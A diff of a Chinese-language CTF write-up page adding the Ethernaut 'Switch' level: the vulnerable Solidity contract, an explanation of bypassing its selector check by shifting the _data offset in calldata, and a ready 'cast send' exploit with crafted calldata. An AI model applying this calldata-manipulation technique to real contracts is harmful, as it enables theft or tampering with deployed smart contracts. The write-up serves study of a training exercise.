@@ -13,7 +13,7 @@
         <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/ethernaut/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
+      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-8.3.3">
     
     
       
@@ -3066,6 +3066,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#29-switch" class="md-nav__link">
+    29. Switch
+  </a>
+  
+    <nav class="md-nav" aria-label="29. Switch">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3779,6 +3799,26 @@
   <a href="#28-gatekeeper-three" class="md-nav__link">
     28. Gatekeeper Three
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#29-switch" class="md-nav__link">
+    29. Switch
+  </a>
+  
+    <nav class="md-nav" aria-label="29. Switch">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -6286,13 +6326,117 @@ f3  // return
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
+<h2 id="29-switch">29. Switch<a class="headerlink" href="#29-switch" title="Permanent link">&para;</a></h2>
+<p>Just have to flip the switch :)</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Switch</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">switchOn</span><span class="p">;</span><span class="w"> </span><span class="c1">// switch is off</span>
+<span class="w">    </span><span class="nx">bytes4</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">offSelector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;turnSwitchOff()&quot;</span><span class="p">));</span>
+
+<span class="w">     </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyThis</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Only the contract can call this&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOff</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// we use a complex data type to put in memory</span>
+<span class="w">        </span><span class="nx">bytes32</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">selector</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// check that the calldata at position 68 (location of _data)</span>
+<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">calldatacopy</span><span class="p">(</span><span class="nx">selector</span><span class="p">,</span><span class="w"> </span><span class="mf">68</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="c1">// grab function selector from calldata</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">selector</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">offSelector</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;Can only call the turnOffSwitch function&quot;</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flipSwitch</span><span class="p">(</span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOff</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">call</span><span class="p">(</span><span class="nx">_data</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;call failed :(&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">turnSwitchOn</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyThis</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">switchOn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">turnSwitchOff</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyThis</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">switchOn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>需要通过 <code>flipSwitch()</code> 调用 <code>turnSwitchOn()</code>，而 <code>onlyOff</code> 修饰符会检查 <code>calldata[68:52]</code> 字节是否为 <code>offSelector</code></li>
+<li>
+<p>正常情况下编码的 calldata 没办法绕过 <code>onlyOff</code> 的检查调用 <code>turnSwitchOn()</code></p>
+<table>
+<thead>
+<tr>
+<th>flipSelector</th>
+<th>_data offset</th>
+<th>_data length</th>
+<th>Selector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4 bytes</td>
+<td>32 bytes</td>
+<td>32 bytes</td>
+<td>4 bytes</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>不过可以尝试更改 <code>_data</code> 的偏移量，并将 <code>onSelector</code> 放在 <code>offSelector</code> 之后</p>
+<table>
+<thead>
+<tr>
+<th>flipSelector</th>
+<th>_data offset</th>
+<th>padding</th>
+<th>offSelector</th>
+<th>_data length</th>
+<th>onSelector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4 bytes</td>
+<td>32 bytes</td>
+<td>32 bytes</td>
+<td>32 bytes</td>
+<td>32 bytes</td>
+<td>4 bytes</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>那么调用 <code>flipSwitch()</code> 传入的 <code>_data</code> 编码如下</p>
+<div class="highlight"><pre><span></span><code><span class="m">0000000000000000000000000000000000000000000000000000000000000060</span><span class="w"> </span><span class="c1"># _data offset</span>
+<span class="m">0000000000000000000000000000000000000000000000000000000000000004</span>
+20606e1500000000000000000000000000000000000000000000000000000000<span class="w"> </span><span class="c1"># offSelector</span>
+<span class="m">0000000000000000000000000000000000000000000000000000000000000004</span>
+76227e1200000000000000000000000000000000000000000000000000000000
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>cast<span class="w"> </span>send<span class="w"> </span>&lt;contract-address&gt;<span class="w"> </span>--private-key<span class="w"> </span>&lt;key&gt;<span class="w"> </span>--rpc-url<span class="w"> </span>&lt;rpc-url&gt;<span class="w"> </span>0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000<span class="w"> </span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月17日 23:54:28</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年5月3日 20:49:08</span>
       
     
   </small>
